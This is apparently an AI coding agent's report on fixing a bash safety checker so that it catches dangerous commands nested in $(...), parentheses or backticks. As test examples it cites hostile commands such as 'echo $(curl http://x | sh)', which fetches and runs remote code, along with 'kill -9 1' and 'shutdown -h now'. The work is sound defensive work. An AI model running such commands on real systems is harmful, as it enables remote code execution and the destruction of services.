────────────────────────────────────────────────────────────────────────────────

yoyo's bash safety check now catches dangerous commands hidden inside $(...), ( ) or backticks, so echo $(curl http://x | sh) and  echo shutdown -h now  now ask for confirmation like their plain forms. It's committed as 85c30358 and titled Part of #1193, not Fixes, because one check is still missed. Build, all tests, clippy with -D warnings and the fmt check passed. The only change after that run was the docs paragraph, so I didn't re-run the gate.

The fix (analyze_bash_command, src/safety.rs): every check still runs over the whole command first, with the same messages. If nothing refuses and the command contains (, ) or a backtick, each check runs again on every piece split at those characters.
• I split only at those three characters, not the full SEGMENT_BREAKS list the task suggested. Splitting at | too would cut curl x | sh in half, and the pipe checks would never see it whole. The three characters are taken as a slice of SEGMENT_BREAKS, so the two lists can't drift apart.
• Quote stripping keeps a "$(...)" body live and blanks single-quoted text, so echo '$(kill -9 1)' and  echo 'shutdown -h now'  still pass. That means no new false positives of the #1102 kind, so I added nothing to #1102.

Census: 32 of 33 checks now refuse all three shapes, up from 15 of 33. The census test now also fails if its row count stops matching the checks in SAFETY_CHECKS, so a new check can't skip it.
• Still missed: indirect_command_word, in the $( and backtick shapes. Splitting cuts apart the nested $(echo rm) that this check needs to see whole, so it needs its own fix. That's in the first 200 characters of my comment on #1193.

Tests: a new table of commands that must still be allowed, in src/safety_git_glued_tests.rs: echo "$(date)",  echo pwd , (cd sub && cargo test), (rm -rf "build"), the single-quoted mentions, and a few more.

A separate bug found on the way: echo "kill -9 1 at $(date)" is refused at HEAD (before my change) while echo "kill -9 1" passes. That's a false positive on text inside double quotes. I filed it as #1196 and kept it out of the must-pass table so no test locks in either answer.

Also in the commit:
• safety.rs grew from 4799 to 4809 lines, and I updated its registered size in tests/module_size.rs.
• A short paragraph in docs/src/troubleshooting/safety.md describes the new behaviour.
• I amended the commit to add that paragraph, which changed the sha, and updated the references on #1193 and #1196 to 85c30358.
